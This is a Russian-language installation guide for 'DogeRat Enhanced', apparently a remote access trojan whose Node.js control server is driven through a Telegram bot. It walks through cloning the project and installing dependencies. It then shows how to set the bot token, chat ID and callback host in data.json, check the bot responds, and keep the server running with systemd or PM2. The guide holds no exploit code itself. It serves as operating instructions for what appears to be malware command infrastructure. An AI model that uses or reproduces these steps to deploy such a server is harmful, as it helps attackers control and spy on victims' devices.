# 🚀 Руководство по установке DogeRat Enhanced

## 📋 Содержание
1. [Системные требования](#системные-требования)
2. [Быстрая установка](#быстрая-установка)
3. [Подробная установка](#подробная-установка)
4. [Настройка Telegram бота](#настройка-telegram-бота)
5. [Первый запуск](#первый-запуск)
6. [Проверка работоспособности](#проверка-работоспособности)
7. [Устранение неполадок](#устранение-неполадок)

## 🖥️ Системные требования

### Минимальные требования:
- **Node.js**: версия 14.0 или выше
- **NPM**: версия 6.0 или выше
- **RAM**: минимум 512 MB
- **Диск**: 100 MB свободного места
- **ОС**: Windows, Linux, macOS

### Рекомендуемые требования:
- **Node.js**: версия 18.0 или выше
- **NPM**: версия 8.0 или выше
- **RAM**: 1 GB или больше
- **Диск**: 500 MB свободного места
- **Интернет**: стабильное подключение

## ⚡ Быстрая установка

### 1. Клонирование репозитория
```bash
git clone https://github.com/your-repo/DogeRat-Enhanced.git
cd DogeRat-Enhanced
```

### 2. Установка зависимостей
```bash
npm install
```

### 3. Настройка
```bash
node start_enhanced.js
# Выберите опцию 4 (Setup Wizard)
```

### 4. Запуск
```bash
npm start
```

## 📖 Подробная установка

### Шаг 1: Установка Node.js

#### Windows:
1. Скачайте Node.js с [официального сайта](https://nodejs.org/)
2. Запустите установщик и следуйте инструкциям
3. Проверьте установку:
```cmd
node --version
npm --version
```

#### Linux (Ubuntu/Debian):
```bash
curl -fsSL https://deb.nodesource.com/setup_18.x | sudo -E bash -
sudo apt-get install -y nodejs
```

#### Linux (CentOS/RHEL):
```bash
curl -fsSL https://rpm.nodesource.com/setup_18.x | sudo bash -
sudo yum install -y nodejs npm
```

#### macOS:
```bash
# Используя Homebrew
brew install node

# Или скачайте с официального сайта
```

### Шаг 2: Получение исходного кода

#### Вариант A: Клонирование через Git
```bash
git clone https://github.com/your-repo/DogeRat-Enhanced.git
cd DogeRat-Enhanced
```

#### Вариант B: Скачивание ZIP архива
1. Скачайте ZIP архив с GitHub
2. Распакуйте в желаемую папку
3. Откройте терминал в папке проекта

### Шаг 3: Установка зависимостей

```bash
# Установка основных зависимостей
npm install

# Проверка установки
npm list --depth=0
```

### Шаг 4: Проверка структуры проекта

Убедитесь, что у вас есть следующие файлы и папки:
```
DogeRat-Enhanced/
├── config/
│   └── enhanced_config.json
├── modules/
│   ├── scheduler.js
│   ├── security.js
│   ├── fileManager.js
│   └── networkTools.js
├── examples/
│   └── api_examples.js
├── uploads/
├── downloads/
├── data.json
├── enhanced_server.js
├── start_enhanced.js
├── demo.js
├── package.json
└── README_ENHANCED.md
```

## 🤖 Настройка Telegram бота

### Шаг 1: Создание бота

1. Откройте Telegram и найдите [@BotFather](https://t.me/botfather)
2. Отправьте команду `/newbot`
3. Введите имя для вашего бота (например: "My DogeRat Bot")
4. Введите username для бота (например: "mydogerat_bot")
5. Сохраните полученный токен

### Шаг 2: Получение Chat ID

#### Вариант A: Через @userinfobot
1. Найдите [@userinfobot](https://t.me/userinfobot) в Telegram
2. Отправьте любое сообщение
3. Скопируйте ваш ID

#### Вариант B: Через API
1. Отправьте сообщение вашему боту
2. Откройте в браузере:
```
https://api.telegram.org/bot<YOUR_BOT_TOKEN>/getUpdates
```
3. Найдите "chat":{"id": в ответе

### Шаг 3: Настройка конфигурации

Отредактируйте файл `data.json`:
```json
{
    "token": "1234567890:ABCdefGHIjklMNOpqrsTUVwxyz",
    "id": "123456789",
    "host": "https://your-server.com/",
    "text": "Custom notification text"
}
```

## 🚀 Первый запуск

### Использование мастера установки

```bash
node start_enhanced.js
```

Выберите нужную опцию:
- **1** - Запуск сервера
- **2** - Проверка конфигурации  
- **3** - Установка зависимостей
- **4** - Мастер настройки
- **5** - Системная информация
- **6** - Тест подключения

### Ручной запуск

```bash
# Запуск enhanced версии
npm start

# Или
node enhanced_server.js

# Запуск оригинальной версии
npm run start:original
```

### Запуск в режиме разработки

```bash
npm run dev
```

## ✅ Проверка работоспособности

### 1. Проверка сервера
После запуска вы должны увидеть:
```
🚀 Enhanced DogeRat server running on port 3000
📱 Telegram bot active
🔧 Enhanced features enabled
```

### 2. Проверка Telegram бота
1. Найдите вашего бота в Telegram
2. Отправьте команду `/start`
3. Вы должны получить приветственное сообщение с меню

### 3. Тест функций
```bash
# Запуск демонстрации
node demo.js

# Тест подключения
node start_enhanced.js
# Выберите опцию 6
```

### 4. Проверка логов
```bash
# Просмотр логов
npm run logs

# Или вручную
tail -f *.log
```

## 🔧 Устранение неполадок

### Проблема: "Cannot find module"
**Решение:**
```bash
rm -rf node_modules package-lock.json
npm install
```

### Проблема: "Port already in use"
**Решение:**
```bash
# Найти процесс на порту 3000
lsof -i :3000

# Завершить процесс
kill -9 <PID>

# Или изменить порт в config/enhanced_config.json
```

### Проблема: "Bot token invalid"
**Решение:**
1. Проверьте токен в `data.json`
2. Убедитесь, что токен скопирован полностью
3. Создайте нового бота через @BotFather

### Проблема: "Permission denied"
**Решение:**
```bash
# Linux/macOS
chmod +x start_enhanced.js

# Или запуск через node
node start_enhanced.js
```

### Проблема: "Network error"
**Решение:**
1. Проверьте интернет-соединение
2. Проверьте настройки файрвола
3. Убедитесь, что порт не заблокирован

### Проблема: Бот не отвечает
**Решение:**
1. Проверьте статус сервера
2. Проверьте логи на ошибки
3. Перезапустите сервер
4. Проверьте Chat ID в конфигурации

## 📊 Мониторинг и обслуживание

### Автоматический запуск (Linux)

Создайте systemd сервис:
```bash
sudo nano /etc/systemd/system/dogerat.service
```

Содержимое файла:
```ini
[Unit]
Description=DogeRat Enhanced Server
After=network.target

[Service]
Type=simple
User=your-username
WorkingDirectory=/path/to/DogeRat-Enhanced
ExecStart=/usr/bin/node enhanced_server.js
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
```

Активация сервиса:
```bash
sudo systemctl enable dogerat
sudo systemctl start dogerat
sudo systemctl status dogerat
```

### Автоматический запуск (Windows)

Используйте PM2:
```cmd
npm install -g pm2
pm2 start enhanced_server.js --name "dogerat"
pm2 startup
pm2 save
```

### Резервное копирование

```bash
# Создание резервной копии
npm run backup

# Или вручную
tar -czf backup_$(date +%Y%m%d_%H%M%S).tar.gz *.json *.js modules/ config/
```

### Обновление

```bash
# Остановка сервера
pm2 stop dogerat

# Обновление кода
git pull origin main

# Установка новых зависимостей
npm install

# Запуск сервера
pm2 start dogerat
```

## 🔒 Безопасность

### Рекомендации по безопасности:
1. **Не делитесь токеном бота**
2. **Используйте сильные пароли**
3. **Регулярно обновляйте систему**
4. **Мониторьте логи безопасности**
5. **Ограничьте доступ к серверу**

### Настройка файрвола (Linux):
```bash
# UFW
sudo ufw allow 3000/tcp
sudo ufw enable

# iptables
sudo iptables -A INPUT -p tcp --dport 3000 -j ACCEPT
```

## 📞 Поддержка

### Получение помощи:
- 📖 [Документация](README_ENHANCED.md)
- 🐛 [Сообщить об ошибке](https://github.com/your-repo/issues)
- 💬 [Telegram канал](https://t.me/dogerat_enhanced)
- 📧 [Email поддержка](mailto:support@dogerat.com)

### Полезные команды:
```bash
# Проверка версии
node --version
npm --version

# Проверка портов
netstat -tulpn | grep :3000

# Проверка процессов
ps aux | grep node

# Очистка логов
npm run clean

# Просмотр системной информации
node start_enhanced.js
# Выберите опцию 5
```

---

**🎉 Поздравляем! DogeRat Enhanced успешно установлен и готов к использованию!**

Для получения дополнительной информации изучите [README_ENHANCED.md](README_ENHANCED.md) и запустите демонстрацию командой `node demo.js`.